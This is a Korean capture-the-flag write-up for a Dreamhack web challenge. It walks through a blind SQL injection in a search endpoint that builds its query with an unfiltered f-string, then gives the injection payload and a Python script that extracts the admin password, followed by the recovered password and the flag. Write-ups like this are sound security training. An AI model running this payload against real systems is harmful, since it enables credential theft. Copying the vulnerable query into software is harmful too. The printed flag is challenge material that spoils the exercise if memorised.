# [Dreamhack] Secret Data System Writeup

- **Date:** 2026-04-04
- **Category:** Web Hacking
- **Tags:** #sqli #blind-sqli #python-exploit

## 1. 분석
- 검색 및 로그인 기능 존재.
- `/search` 쿼리 결과에 따른 참/거짓 응답 차이 명확.
- Blind SQL Injection 취약점 확인.

## 2. 코드 확인
- `app.py` 소스 코드 내 쿼리 구성 방식 확인.
- `sql = f"SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'"`
- 입력값 필터링 전무.
- `users` 테이블 내 `admin` 계정 존재 (비밀번호: 16자리 hex).

## 3. 공격 시나리오
- `/search` 엔드포인트 대상 서브쿼리 주입.
- SQLite `LIKE` 연산자 및 와일드카드(`%`) 활용.
- 페이로드: `x%' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE '{pw}{char}%') --`
- 추출한 비밀번호로 관리자 로그인 및 플래그 확인.

## 4. 익스플로잇
- Python 자동화 스크립트 작성 및 실행.

```python
import requests

TARGET = "http://host8.dreamhack.games:18284/search"
CHARS = "0123456789abcdef"
pw = ""

for i in range(1, 17):
    for c in CHARS:
        payload = f"x%' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE '{pw}{c}%') --"
        if "Found!" in requests.post(TARGET, data={"query": payload}).text:
            pw += c
            print(f"[{i}] {pw}")
            break
```

## 5. 결과
- 관리자 비밀번호: `c86e7cf14bbc43db`
- 어드민 패널 접속 및 플래그 획득 성공.
- **Flag**: `DH{94c83b97d2292c64d964f68e5ccf4ec9}`
